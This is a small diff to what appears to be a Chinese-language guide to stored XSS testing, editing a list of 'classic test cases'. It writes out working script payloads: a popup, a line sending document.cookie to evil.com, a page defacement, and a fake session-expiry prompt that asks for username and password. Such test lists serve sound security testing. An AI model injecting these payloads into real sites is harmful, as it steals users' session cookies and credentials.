@@ -18,7 +18,7 @@
 
 **经典测试用例**:
 - 基础弹窗: `<script>alert('存储型XSS触发')</script>`
-- 窃取Cookie: `<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>`
+- 窃取Cookie: `<script>new Image().src='http://evil.com/?c='+document.cookie</script>`
 - 页面劫持: `<script>document.body.innerHTML='<h1>页面被XSS劫持！</h1>'</script>`
 - 钓鱼攻击: `<script>alert('会话过期，请重新登录：'+prompt('用户名：')+prompt('密码：'))</script>`
 
